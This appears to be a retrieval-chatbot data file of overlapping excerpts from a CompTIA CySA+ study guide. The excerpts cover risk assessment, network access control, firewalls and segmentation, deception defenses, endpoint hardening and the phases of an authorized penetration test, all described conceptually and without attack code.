threats. Before diving into the world of risk assessment, we must begin with a common vocabulary. You must know three important terms to communicate clearly with other risk analysts: vulnerabilities, threats, and risks. A vulnerability is a weakness in a device, system, application, or process that might allow an attack to take place. Vulnerabilities are internal factors that may be controlled by cybersecurity professionals. For example, a web server that is running an outdated version of the Apache service may contain a vulnerability that would allow an attacker to conduct
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	then design an appropriate set of controls to meet those threats. Before diving into the world of risk assessment, we must begin with a common vocabulary. You must know three important terms to communicate clearly with other risk analysts: vulnerabilities, threats, and risks. A vulnerability is a weakness in a device, system, application, or process that might allow an attack to take place. Vulnerabilities are internal factors that may be controlled by cybersecurity professionals. For example, a web server that is running an outdated version of the Apache service may contain a vulnerability that would allow an attacker to conduct a denial-­of-­service (DoS) attack against the websites hosted on that server, jeopardizing their availability. Cybersecurity professionals within the organization have the ability to remediate this vulnerability by upgrading the Apache service to the most recent version that is not susceptible to the DoS attack. A threat in the world of cybersecurity is an outside force that may exploit a vulnerability. For example, a hacker who would like to conduct a DoS attack against a website and knows about an Apache vulnerability poses a clear cybersecurity threat. Although many threats are malicious in nature, this is not necessarily the case. For example, an earthquake may also disrupt the availability of a website by damaging the datacenter containing the web servers. Earthquakes clearly do not have malicious intent. In most cases, cybersecurity professionals cannot do much to eliminate a threat. Hackers will hack and earthquakes will strike whether we like it or not. A risk is the combination of a threat and a corresponding vulnerability. Both of these factors must be present before a situation poses a risk to the security of an organization. For example, if a hacker targets an organization’s web server with a DoS attack but the server was patched so that it is not vulnerable to that attack, there is no risk because even though a threat is present (the hacker), there is no vulnerability. Similarly, a datacenter may be vulnerable to earthquakes because the walls are not built to withstand the extreme movements present during an earthquake, but it may be located in a region of the world where earthquakes do not occur. The datacenter may be vulnerable to earthquakes but there is little to no threat of earthquake in its location, so there is no risk. The relationship between risks, threats, and vulnerabilities is an important one, and it is often represented by this equation: Risk Threat Vulnerability This is not meant to be a literal equation where you would actually plug in values. Instead, it is meant to demonstrate the fact that risks exist only when there is both a threat and a corresponding vulnerability that the threat might exploit. If either the threat or vulnerability is zero, the risk is also zero. Figure 1.2 shows this in another way: risks are the intersection of threats and vulnerabilities. 8 Chapter 1 ■ Today’s Cybersecurity Analyst Risks Vulnerabilities Threats F I G U R E 1.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	one, and it is often represented by this equation: Risk Threat Vulnerability This is not meant to be a literal equation where you would actually plug in values. Instead, it is meant to demonstrate the fact that risks exist only when there is both a threat and a corresponding vulnerability that the threat might exploit. If either the threat or vulnerability is zero, the risk is also zero. Figure 1.2 shows this in another way: risks are the intersection of threats and vulnerabilities. 8 Chapter 1 ■ Today’s Cybersecurity Analyst Risks Vulnerabilities Threats F I G U R E 1. 2 Risks exist at the intersection of threats and vulnerabilities. If either the threat or vulnerability is missing, there is no risk. Organizations should routinely conduct risk assessments to take stock of their existing risk landscape. The National Institute of Standards and Technology (NIST) publishes a guide for conducting risk assessments that is widely used throughout the cybersecurity field as a foundation for risk assessments. The document, designated NIST Special Publication (SP) 800-­30, suggests the risk assessment process shown in Figure 1.3. F I G U R E 1. 3 The NIST SP 800-­30 risk assessment process suggests that an organization should identify threats and vulnerabilities and then use that information to determine the level of risk posed by the combination of those threats and vulnerabilities. Step 1: Prepare for Assessment Derived from Organizational Risk Frame Step 2: Conduct Assessment Identify Threat Sources and Events Identify Vulnerabilities and Predisposing Conditions Determine Likelihood of Occurrence Determine Magnitude of Impact Determine Risk Source: NIST SP 800-30 / U.S Department of Commerce / Public Domain Step 4: Maintain Assessment Step 3: Communicate Results Expanded Task View Evaluating Security Risks 9 Identify Threats Organizations begin the risk assessment process by identifying the types of threats that exist in their threat environment. Although some threats, such as malware and spam, affect all organizations, other threats are targeted against specific types of organizations. For example, government-­sponsored advanced persistent threat (APT) attackers typically target government agencies, military organizations, and companies that operate in related fields. It is unlikely that an APT attacker would target an elementary school. NIST identifies four categories of threats that an organization might face and should consider in its threat identification process: ■■ ■■ ■■ ■■ Adversarial threats are individuals, groups, and organizations that are attempting to deliberately undermine the security of an organization. Adversaries may include trusted insiders, competitors, suppliers, customers, business partners, or even nation-­states. When evaluating an adversarial threat, cybersecurity analysts should consider the capability of the threat actor to engage in attacks, the intent of the threat actor, and the likelihood that the threat will target the organization. Accidental threats occur when individuals doing their routine work mistakenly perform an action that undermines security. For example, a system administrator might accidentally delete a critical disk volume, causing a loss of availability. When evaluating an accidental threat, cybersecurity analysts should consider the possible range of effects that the threat might
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	organization. Adversaries may include trusted insiders, competitors, suppliers, customers, business partners, or even nation-­states. When evaluating an adversarial threat, cybersecurity analysts should consider the capability of the threat actor to engage in attacks, the intent of the threat actor, and the likelihood that the threat will target the organization. Accidental threats occur when individuals doing their routine work mistakenly perform an action that undermines security. For example, a system administrator might accidentally delete a critical disk volume, causing a loss of availability. When evaluating an accidental threat, cybersecurity analysts should consider the possible range of effects that the threat might have on the organization. Structural threats occur when equipment, software, or environmental controls fail due to the exhaustion of resources (such as running out of gas), exceeding their operational capability (such as operating in extreme heat), or simply failing due to age. Structural threats may come from IT components (such as storage, servers, and network devices), environmental controls (such as power and cooling infrastructure), and software (such as operating systems and applications). When evaluating a structural threat, cybersecurity analysts should consider the possible range of effects that the threat might have on the organization. Environmental threats occur when natural or human-­made disasters occur that are outside the control of the organization. These might include fires, flooding, severe storms, power failures, or widespread telecommunications disruptions. When evaluating environmental threats, cybersecurity analysts should consider common natural environmental threats to their geographic region, as well as how to appropriately prevent or counter human-­made environmental threats. The nature and scope of the threats in each of these categories will vary depending on the nature of the organization, the composition of its technology infrastructure, and many other situation-­specific circumstances. That said, it may be helpful to obtain copies of the risk assessments performed by other, similar organizations as a starting point for an organization’s own risk assessment or to use as a quality assessment check during various stages of the organization’s assessment. 10 Chapter 1 ■ Today’s Cybersecurity Analyst The Insider Threat When performing a threat analysis, cybersecurity professionals must remember that threats come from both external and internal sources. In addition to the hackers, natural disasters, and other threats that begin outside the organization, rogue employees, disgruntled team members, and incompetent administrators also pose a significant threat to enterprise cybersecurity. As an organization designs controls, it must consider both internal and external threats. NIST SP 800-­30 provides a great deal of additional information to help organizations conduct risk assessments, including detailed tasks associated with each of these steps. This information is outside the scope of the Cybersecurity Analyst (CySA+) exam, but organizations preparing to conduct risk assessments should download and read the entire publication. It is available at https://csrc.nist.gov/publications/detail/ sp/800-­30/rev-­1/final. Identify Vulnerabilities During the threat identification phase of a risk assessment, cybersecurity analysts focus on the external factors likely to impact an organization’s security efforts. After completing threat identification, the focus of the assessment turns inward, identifying the vulnerabilities that those threats might exploit
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	SP 800-­30 provides a great deal of additional information to help organizations conduct risk assessments, including detailed tasks associated with each of these steps. This information is outside the scope of the Cybersecurity Analyst (CySA+) exam, but organizations preparing to conduct risk assessments should download and read the entire publication. It is available at https://csrc.nist.gov/publications/detail/ sp/800-­30/rev-­1/final. Identify Vulnerabilities During the threat identification phase of a risk assessment, cybersecurity analysts focus on the external factors likely to impact an organization’s security efforts. After completing threat identification, the focus of the assessment turns inward, identifying the vulnerabilities that those threats might exploit to compromise an organization’s confidentiality, integrity, or availability. Chapter 6, “Designing a Vulnerability Management Program,” and Chapter 7, “Analyzing Vulnerability Scans,” of this book focus extensively on the identification and management of vulnerabilities. Determine Likelihood, Impact, and Risk After identifying the threats and vulnerabilities facing an organization, risk assessors next seek out combinations of threat and vulnerability that pose a risk to the confidentiality, integrity, or availability of enterprise information and systems. This requires assessing both the likelihood that a risk will materialize and the impact that the risk will have on the organization if it does occur. When determining the likelihood of a risk occurring, analysts should consider two factors. First, they should assess the likelihood that the threat source will initiate the risk. In the case of an adversarial threat source, this is the likelihood that the adversary will execute an attack against the organization. In the case of accidental, structural, or environmental threats, it is the likelihood that the threat will occur. The second factor that contributes is the likelihood that, if a risk occurs, it will actually have an adverse impact on the organization, Evaluating Security Risks 11 given the state of the organization’s security controls. After considering each of these criteria, risk assessors assign an overall likelihood rating. This may use categories, such as “low,” “medium,” and “high,” to describe the likelihood qualitatively. Risk assessors evaluate the impact of a risk using a similar rating scale. This evaluation should assume that a threat does take place and causes a risk to the organization and then attempt to identify the magnitude of the adverse impact that the risk will have on the organization. When evaluating this risk, it is helpful to refer to the three objectives of cybersecurity shown in Figure 1.1, confidentiality, integrity, and availability, and then assess the impact that the risk would have on each of these objectives. Exam Note The risk assessment process described here, using categories of “high,” “medium,” and “low,” is an example of a qualitative risk assessment process. Risk assessments also may use quantitative techniques that numerically assess the likelihood and impact of risks. Quantitative risk assessments are beyond the scope of the Cybersecurity Analyst (CySA+) exam but are found on more advanced security exams, including the CompTIA Advanced Security Practitioner (CASP+) and Certified Information Systems Security Professional (CISSP) exams. After assessing the likelihood and impact of a risk,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and then assess the impact that the risk would have on each of these objectives. Exam Note The risk assessment process described here, using categories of “high,” “medium,” and “low,” is an example of a qualitative risk assessment process. Risk assessments also may use quantitative techniques that numerically assess the likelihood and impact of risks. Quantitative risk assessments are beyond the scope of the Cybersecurity Analyst (CySA+) exam but are found on more advanced security exams, including the CompTIA Advanced Security Practitioner (CASP+) and Certified Information Systems Security Professional (CISSP) exams. After assessing the likelihood and impact of a risk, risk assessors then combine those two evaluations to determine an overall risk rating. This may be as simple as using a matrix similar to the one shown in Figure 1.4 that describes how the organization assigns overall ratings to risks. For example, an organization might decide that the likelihood of a hacker attack is medium whereas the impact would be high. Looking this combination up in Figure 1.4 reveals that it should be considered a high overall risk. Similarly, if an organization assesses the likelihood of a flood as medium and the impact as low, a flood scenario would have an overall risk of low. High High High Medium Likelihood Medium Low Medium High Low F I G U R E 1. 4 Many organizations use a risk matrix to determine an overall risk rating based on likelihood and impact assessments. Low Low Medium Low Medium High Impact 12 Chapter 1 ■ Today’s Cybersecurity Analyst Reviewing Controls Cybersecurity professionals use risk management strategies, such as risk acceptance, risk avoidance, risk mitigation, and risk transference, to reduce the likelihood and impact of risks identified during risk assessments. The most common way that organizations manage security risks is to develop sets of technical and operational security controls that mitigate those risks to acceptable levels. Technical controls are systems, devices, software, and settings that work to enforce confidentiality, integrity, and/or availability requirements. Examples of technical controls include building a secure network and implementing endpoint security, two topics discussed later in this chapter. Operational controls are practices and procedures that bolster cybersecurity. Examples of operational controls include conducting penetration testing and using reverse engineering to analyze acquired software. These two topics are also discussed later in this chapter. Building a Secure Network Many threats to an organization’s cybersecurity exploit vulnerabilities in the organization’s network to gain initial access to systems and information. To help mitigate these risks, organizations should focus on building secure networks that keep attackers at bay. Examples of the controls that an organization may use to contribute to building a secure network include network access control (NAC) solutions; network perimeter security controls, such as firewalls; network segmentation; and the use of deception as a defensive measure. Exam Note Much of the material in this chapter is not directly testable on the CySA+ exam. You won’t, for example, find a question asking you how to configure a NAC solution. However, that doesn’t
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to gain initial access to systems and information. To help mitigate these risks, organizations should focus on building secure networks that keep attackers at bay. Examples of the controls that an organization may use to contribute to building a secure network include network access control (NAC) solutions; network perimeter security controls, such as firewalls; network segmentation; and the use of deception as a defensive measure. Exam Note Much of the material in this chapter is not directly testable on the CySA+ exam. You won’t, for example, find a question asking you how to configure a NAC solution. However, that doesn’t mean that you don’t need to know this material! You’ll need to be familiar with the security controls in this chapter in order to analyze logs, recommend remediations, and conduct many other activities that are directly testable on the exam. The exam does assume that you have a basic familiarity with cybersecurity tools and techniques. Network Access Control One of the basic security objectives set forth by most organizations is controlling access to the organization’s network. Network access control (NAC) solutions help security professionals achieve two cybersecurity objectives: limiting network access to authorized Building a Secure Network 13 individuals and ensuring that systems accessing the organization’s network meet basic security requirements. The 802.1X protocol is a common standard used for NAC. When a new device wishes to gain access to a network, either by connecting to a wireless access point or plugging into a wired network port, the network challenges that device to authenticate using the 802.1X protocol. A special piece of software, known as a supplicant, resides on the device requesting to join the network. The supplicant communicates with a service known as the authenticator that runs on either the wireless access point or the network switch. The authenticator does not have the information necessary to validate the user itself, so it passes access requests along to an authentication server using the Remote Authentication Dial-­In User Service (RADIUS) protocol. If the user correctly authenticates and is authorized to access the network, the switch or access point then joins the user to the network. If the user does not successfully complete this process, the device is denied access to the network or may be assigned to a special quarantine network for remediation. Figure 1.5 shows the devices involved in 802.1X authentication. F I G U R E 1. 5 In an 802.1X system, the device attempting to join the network runs a NAC supplicant, which communicates with an authenticator on the network switch or wireless access point. The authenticator uses RADIUS to communicate with an authentication server. Supplicant Authenticator RADIUS Server Many NAC solutions are available on the market, and they differ in two major ways: Agent-­Based vs. Agentless Agent-­based solutions, such as 802.1X, require that the device requesting access to the network run special software designed to communicate with the NAC service. Agentless approaches to NAC conduct authentication in the web browser and do not require special software. In-­Band
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	an 802.1X system, the device attempting to join the network runs a NAC supplicant, which communicates with an authenticator on the network switch or wireless access point. The authenticator uses RADIUS to communicate with an authentication server. Supplicant Authenticator RADIUS Server Many NAC solutions are available on the market, and they differ in two major ways: Agent-­Based vs. Agentless Agent-­based solutions, such as 802.1X, require that the device requesting access to the network run special software designed to communicate with the NAC service. Agentless approaches to NAC conduct authentication in the web browser and do not require special software. In-­Band vs. Out-­of-­Band In-­band (or inline) NAC solutions use dedicated appliances that sit in between devices and the resources that they wish to access. They deny or limit network access to devices that do not pass the NAC authentication process. The “captive portal” NAC solutions found in hotels that hijack all web requests until the guest enters a room number are examples of in-­band NAC. Out-­of-­band NAC solutions, such as 802.1X, leverage the existing network infrastructure and have network devices communicate with authentication servers and then reconfigure the network to grant or deny network access, as needed. 14 Chapter 1 ■ Today’s Cybersecurity Analyst NAC solutions are often used simply to limit access to authorized users based on those users successfully authenticating, but they may also make network admission decisions based on other criteria. Some of the criteria used by NAC solutions are as follows: Time of Day Users may be authorized to access the network only during specific time periods, such as during business hours. Role Users may be assigned to particular network segments based on their role in the organization. For example, a college might assign faculty and staff to an administrative network that may access administrative systems while assigning students to an academic network that does not allow such access. Location Users may be granted or denied access to network resources based on their physical location. For example, access to the datacenter network may be limited to systems physically present in the datacenter. System Health NAC solutions may use agents running on devices to obtain configuration information from the device. Devices that fail to meet minimum security standards, such as having incorrectly configured host firewalls, outdated virus definitions, or missing security patches, may be either completely denied network access or placed on a special quarantine network where they are granted only the limited access required to update the system’s security. Administrators may create NAC rules that limit access based on any combination of these characteristics. NAC products provide the flexibility needed to implement the organization’s specific security requirements for network admission. You’ll sometimes see the acronym NAC expanded to “Network Admission Control” instead of “network access control.” In both cases, people are referring to the same general technology. Network Admission Control is a proprietary name used by Cisco for its network access control solutions. Firewalls and Network Perimeter Security NAC solutions are designed to manage the systems that
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are granted only the limited access required to update the system’s security. Administrators may create NAC rules that limit access based on any combination of these characteristics. NAC products provide the flexibility needed to implement the organization’s specific security requirements for network admission. You’ll sometimes see the acronym NAC expanded to “Network Admission Control” instead of “network access control.” In both cases, people are referring to the same general technology. Network Admission Control is a proprietary name used by Cisco for its network access control solutions. Firewalls and Network Perimeter Security NAC solutions are designed to manage the systems that connect directly to an organization’s wired or wireless network. They provide excellent protection against intruders who seek to gain access to the organization’s information resources by physically accessing a facility and connecting a device to the physical network. They don’t provide protection against intruders seeking to gain access over a network connection. That’s where firewalls enter the picture. Network firewalls sit at the boundaries between networks and provide perimeter security. Much like a security guard might control the physical perimeter of a building, the network firewall controls the electronic perimeter. Firewalls are typically configured in the triple-­homed fashion illustrated in Figure 1.6. Triple-­homed simply means that the firewall connects to three different networks. The firewall in Figure 1.6 connects to the Internet, Building a Secure Network 15 the internal network, and a special network known as the demilitarized zone (DMZ), or screened subnet. Any traffic that wishes to pass from one zone to another, such as between the Internet and the internal network, must pass through the firewall. F I G U R E 1. 6 A triple-­homed firewall connects to three different networks, typically an internal network, a screened subnet, and the Internet. Internal Network Firewall Internet Screened Subnet Email Server Web Server The screened subnet is a special network zone designed to house systems that receive connections from the outside world, such as web and email servers. Sound firewall designs place these systems on an isolated network where, if they become compromised, they pose little threat to the internal network because connections between the screened subnet and the internal network must still pass through the firewall and are subject to its security policy. Whenever the firewall receives a connection request, it evaluates it according to the firewall’s rule base. This rule base is an access control list (ACL) that identifies the types of traffic permitted to pass through the firewall. The rules used by the firewall typically specify the source and destination IP addresses for traffic as well as the destination port corresponding to the authorized service. A list of common ports appears in Table 1.1. Firewalls follow the default deny principle, which says that if there is no rule explicitly allowing a connection, the firewall will deny that connection. Chapter 1 16 TA B L E 1. 1 ■ Today’s Cybersecurity Analyst Common TCP ports Port Service 20,21 FTP 22 SSH 23 Telnet 25 SMTP 53 DNS
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	that identifies the types of traffic permitted to pass through the firewall. The rules used by the firewall typically specify the source and destination IP addresses for traffic as well as the destination port corresponding to the authorized service. A list of common ports appears in Table 1.1. Firewalls follow the default deny principle, which says that if there is no rule explicitly allowing a connection, the firewall will deny that connection. Chapter 1 16 TA B L E 1. 1 ■ Today’s Cybersecurity Analyst Common TCP ports Port Service 20,21 FTP 22 SSH 23 Telnet 25 SMTP 53 DNS 80 HTTP 110 POP3 123 NTP 143 IMAP 389 LDAP 443 HTTPS 636 LDAPS 1433 SQL Server 1521 Oracle 1723 PPTP 3389 RDP Several categories of firewalls are available on the market today, and they vary in both price and functionality: ■■ Packet filtering firewalls simply check the characteristics of each packet against the firewall rules without any additional intelligence. Packet filtering firewall capabilities are typically found in routers and other network devices and are very rudimentary firewalls. Building a Secure Network ■■ ■■ ■■ 17 Stateful inspection firewalls go beyond packet filters and maintain information about the state of each connection passing through the firewall. These are the most basic firewalls sold as stand-­alone products. Next-­generation firewalls (NGFWs) incorporate even more information into their decision-­making process, including contextual information about users, applications, and business processes. They are the current state-­of-­the-­art in network firewall protection and are quite expensive compared to stateful inspection devices. Web application firewalls (WAFs) are specialized firewalls designed to protect against web application attacks, such as SQL injection and cross-­site scripting. Network Segmentation Firewalls use a principle known as network segmentation to separate networks of differing security levels from each other. This principle certainly applies to the example shown in Figure 1.6, where the internal network, screened subnet, and Internet all have differing security levels. The same principle may be applied to further segment the internal network into different zones of trust. For example, imagine an organization that has several hundred employees and a large datacenter located in its corporate headquarters. The datacenter may house many sensitive systems, such as database servers that contain sensitive employee information, business plans, and other critical information assets. The corporate network may house employees, temporary contractors, visitors, and other people who aren’t entirely trusted. In this common example, security professionals would want to segment the datacenter network so that it is not directly accessible by systems on the corporate network. This can be accomplished using a firewall, as shown in Figure 1.7. The network shown in Figure 1.7 uses a triple-­homed firewall, just as was used to control the network perimeter with the Internet in Figure 1.6. The concept is identical, except in this case the firewall is protecting the perimeter of the datacenter from the less trusted corporate network. Notice that the network in Figure 1.7 also contains a screened subnet with a server called the jump box. The
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	would want to segment the datacenter network so that it is not directly accessible by systems on the corporate network. This can be accomplished using a firewall, as shown in Figure 1.7. The network shown in Figure 1.7 uses a triple-­homed firewall, just as was used to control the network perimeter with the Internet in Figure 1.6. The concept is identical, except in this case the firewall is protecting the perimeter of the datacenter from the less trusted corporate network. Notice that the network in Figure 1.7 also contains a screened subnet with a server called the jump box. The purpose of this server is to act as a secure transition point between the corporate network and the datacenter network, providing a trusted path between the two zones. System administrators who need to access the datacenter network should not connect devices directly to the datacenter network but should instead initiate an administrative connection to the jump box, using Secure Shell (SSH), the Remote Desktop Protocol (RDP), or a similar secure remote administration protocol. After successfully authenticating to the jump box, they may then connect from the jump box to the datacenter network, providing some isolation between their own systems and the datacenter network. Connections to the jump box should be carefully controlled and protected with strong multifactor authentication (MFA) technology. 18 Chapter 1 ■ Today’s Cybersecurity Analyst F I G U R E 1. 7 A triple-­homed firewall may also be used to isolate internal network segments of varying trust levels. Corporate Network Firewall Datacenter Network Database Server Management Server Screened Subnet Jump Box Jump boxes may also be used to serve as a layer of insulation against systems that may only be partially trusted. For example, if you have contractors who bring equipment owned by their employer onto your network or employees bringing personally owned devices, you might use a jump box to prevent those systems from directly connecting to your company’s systems. Defense Through Deception Cybersecurity professionals may wish to go beyond typical security controls and engage in active defensive measures that actually lure attackers to specific targets and seek to monitor their activity in a carefully controlled environment. Honeypots are systems designed to appear to attackers as lucrative targets due to the services they run, vulnerabilities they contain, or sensitive information that they appear to host. The reality is that honeypots are designed by cybersecurity experts to falsely appear vulnerable and fool malicious individuals into attempting an attack against them. When an Secure Endpoint Management 19 attacker tries to compromise a honeypot, the honeypot simulates a successful attack and then monitors the attacker’s activity to learn more about their intentions. Honeypots may also be used to feed network blacklists, blocking all inbound activity from any IP address that attacks the honeypot. DNS sinkholes feed false information to malicious software that works its way onto the enterprise network. When a compromised system attempts to obtain information from a DNS server about its command-­and-­control (C&C or C2) server, the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	falsely appear vulnerable and fool malicious individuals into attempting an attack against them. When an Secure Endpoint Management 19 attacker tries to compromise a honeypot, the honeypot simulates a successful attack and then monitors the attacker’s activity to learn more about their intentions. Honeypots may also be used to feed network blacklists, blocking all inbound activity from any IP address that attacks the honeypot. DNS sinkholes feed false information to malicious software that works its way onto the enterprise network. When a compromised system attempts to obtain information from a DNS server about its command-­and-­control (C&C or C2) server, the DNS server detects the suspicious request and, instead of responding with the correct answer, responds with the IP address of a sinkhole system designed to detect and remediate the botnet-­infected system. Secure Endpoint Management Laptop and desktop computers, tablets, smartphones, and other endpoint devices are a constant source of security threats on a network. These systems interact directly with end users and require careful configuration management to ensure that they remain secure and do not serve as the entry point for a security vulnerability on enterprise networks. Fortunately, by taking some simple security precautions, technology professionals can secure these devices against most attacks. Hardening System Configurations Operating systems are extremely complex pieces of software designed to perform thousands of different functions. The large code bases that make up modern operating systems are a frequent source of vulnerabilities, as evidenced by the frequent security patches issued by operating system vendors. One of the most important ways that system administrators can protect endpoints is by hardening their configurations, making them as attack-­resistant as possible. This includes disabling any unnecessary services or ports on the endpoints to reduce their susceptibility to attack, ensuring that secure configuration settings exist on devices and centrally controlling device security settings. Patch Management System administrators must maintain current security patch levels on all operating systems and applications under their care. Once the vendor releases a security patch, attackers are likely already aware of a vulnerability and may immediately begin preying on susceptible systems. The longer an organization waits to apply security patches, the more likely it becomes that they will fall victim to an attack. That said, enterprises should always test patches prior to deploying them on production systems and networks. Fortunately, patch management software makes it easy to centrally distribute and monitor the patch level of systems throughout the enterprise. For example, Microsoft’s Endpoint 20 Chapter 1 ■ Today’s Cybersecurity Analyst Manager allows administrators to quickly view the patch status of enterprise systems and remediate any systems with missing patches. Compensating Controls In some cases, security professionals may not be able to implement all of the desired security controls due to technical, operational, or financial reasons. For example, an organization may not be able to upgrade the operating system on retail point-­of-­sale (POS) terminals due to an incompatibility with the POS software. In these cases, security professionals should seek out compensating controls designed to provide a similar
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	throughout the enterprise. For example, Microsoft’s Endpoint 20 Chapter 1 ■ Today’s Cybersecurity Analyst Manager allows administrators to quickly view the patch status of enterprise systems and remediate any systems with missing patches. Compensating Controls In some cases, security professionals may not be able to implement all of the desired security controls due to technical, operational, or financial reasons. For example, an organization may not be able to upgrade the operating system on retail point-­of-­sale (POS) terminals due to an incompatibility with the POS software. In these cases, security professionals should seek out compensating controls designed to provide a similar level of security using alternate means. In the POS example, administrators might place the POS terminals on a segmented, isolated network and use intrusion prevention systems to monitor network traffic for any attempt to exploit an unpatched vulnerability and block it from reaching the vulnerable host. This meets the same objective of protecting the POS terminal from compromise and serves as a compensating control. Group Policies Group Policies provide administrators with an efficient way to manage security and other system configuration settings across a large number of devices. Microsoft’s Group Policy Object (GPO) mechanism allows administrators to define groups of security settings once and then apply those settings to either all systems in the enterprise or a group of systems based on role. For example, Figure 1.8 shows a GPO designed to enforce Windows Firewall settings on sensitive workstations. This GPO is configured to require the use of Windows Firewall and block all inbound connections. Administrators may use GPOs to control a wide variety of Windows settings and create different policies that apply to different classes of systems. Endpoint Security Software Endpoint systems should also run specialized security software designed to enforce the organization’s security objectives. At a minimum, this should include antivirus software designed to scan the system for signs of malicious software that might jeopardize the security of the endpoint. Administrators may also choose to install host-­based firewall software that serves as a basic firewall for that individual system, complementing network-­based firewall controls or host intrusion prevention systems (HIPSs) that block suspicious network activity. Endpoint security software should report its status to a centralized management system that allows security administrators to monitor the entire enterprise from a single location. Penetration Testing 21 F I G U R E 1. 8 Group Policy Objects (GPOs) may be used to apply settings to many different systems at the same time. Mandatory Access Controls In highly secure environments, administrators may opt to implement a mandatory access control (MAC) approach to security. In a MAC system, administrators set all security permissions, and end users cannot modify those permissions. This stands in contrast to the discretionary access control (DAC) model found in most modern operating systems where the owner of a file or resource controls the permissions on that resource and can delegate them at their discretion. MAC systems are very unwieldy and, therefore, are rarely used outside of very sensitive government and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	apply settings to many different systems at the same time. Mandatory Access Controls In highly secure environments, administrators may opt to implement a mandatory access control (MAC) approach to security. In a MAC system, administrators set all security permissions, and end users cannot modify those permissions. This stands in contrast to the discretionary access control (DAC) model found in most modern operating systems where the owner of a file or resource controls the permissions on that resource and can delegate them at their discretion. MAC systems are very unwieldy and, therefore, are rarely used outside of very sensitive government and military applications. Security-­Enhanced Linux (SELinux), an operating system developed by the U.S. National Security Agency, is an example of a system that enforces mandatory access controls. Penetration Testing In addition to bearing responsibility for the design and implementation of security controls, cybersecurity analysts are responsible for monitoring the ongoing effectiveness of those controls. Penetration testing is one of the techniques they use to fulfill this obligation. During 22 Chapter 1 ■ Today’s Cybersecurity Analyst a penetration test, the testers simulate an attack against the organization using the same information, tools, and techniques available to real attackers. They seek to gain access to systems and information and then report their findings to management. The results of penetration tests may be used to bolster an organization’s security controls. Penetration tests may be performed by an organization’s internal staff or by external consultants. In the case of internal tests, they require highly skilled individuals and are quite time-­consuming. External tests mitigate these concerns but are often quite expensive to conduct. Despite these barriers to penetration tests, organizations should try to perform them periodically since a well-­designed and well-­executed penetration test is one of the best measures of an organization’s cybersecurity posture. NIST divides penetration testing into the four phases shown in Figure 1.9. F I G U R E 1. 9 NIST divides penetration testing into four phases. Additional Discovery Planning Discovery Attack Reporting Source: NIST SP 800-115 / U.S Department of Commerce / Public Domain Planning a Penetration Test The planning phase of a penetration test lays the administrative groundwork for the test. No technical work is performed during the planning phase, but it is a critical component of any penetration test. There are three important rules of engagement to finalize during the planning phase: Timing When will the test take place? Will technology staff be informed of the test? Can it be timed to have as little impact on business operations as possible? Scope What is the agreed-­on scope of the penetration test? Are any systems, networks, personnel, or business processes off-­limits to the testers? Authorization Who is authorizing the penetration test to take place? What should testers do if they are confronted by an employee or other individual who notices their suspicious activity? These details are administrative in nature, but it is important to agree on them up front and in writing to avoid problems during and after the penetration
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Will technology staff be informed of the test? Can it be timed to have as little impact on business operations as possible? Scope What is the agreed-­on scope of the penetration test? Are any systems, networks, personnel, or business processes off-­limits to the testers? Authorization Who is authorizing the penetration test to take place? What should testers do if they are confronted by an employee or other individual who notices their suspicious activity? These details are administrative in nature, but it is important to agree on them up front and in writing to avoid problems during and after the penetration test. Penetration Testing 23 You should never conduct a penetration test without permission. Not only is an unauthorized test unethical, it may be illegal. Conducting Discovery The technical work of the penetration test begins during the discovery phase when attackers conduct reconnaissance and gather as much information as possible about the targeted network, systems, users, and applications. This may include conducting reviews of publicly available material, performing port scans of systems, using network vulnerability scanners and web application testers to probe for vulnerabilities, and performing other information gathering. Vulnerability scanning is an important component of penetration testing. This topic is covered extensively in Chapters 6 and 7. Executing a Penetration Test During the attack phase, penetration testers seek to bypass the organization’s security controls and gain access to systems and applications run by the organization. Testers often follow the NIST attack process shown in Figure 1.10. F I G U R E 1. 10 The attack phase of a penetration test uses a cyclical process that gains a foothold and then uses it to expand access within the target organization. Additional Discovery Attack Phase Discovery Phase Gaining Access Escalating Privileges System Browsing Enough data has been gathered in the discovery phase to make an informed attempt to access the target. If only userlevel access was obtained in the last step, the tester will now seek to gain complete control of the system (administratorlevel access). The informationgathering process begins again to identify mechanisms to gain access to additional systems. Source: NIST SP 800-­115: Technical Guide to Information Security Testing and Assessment Install Additional Tools Additional penetration testing tools are installed to gain additional information or access or a combination of both. 24 Chapter 1 ■ Today’s Cybersecurity Analyst In this process, attackers use the information gathered during the discovery phase to gain initial access to a system. Once they establish a foothold, they then seek to escalate their access until they gain complete administrative control of the system. From there, they can scan for additional systems on the network, install additional penetration testing tools, and begin the cycle anew, seeking to expand their footprint within the targeted organization. They continue this cycle until they exhaust the possibilities or the time allotted for the test expires. If you’re interested in penetration testing, CompTIA offers a companion certification to the CySA+ called PenTest+. The PenTest+ certification dives deeply into penetration testing topics. Communicating
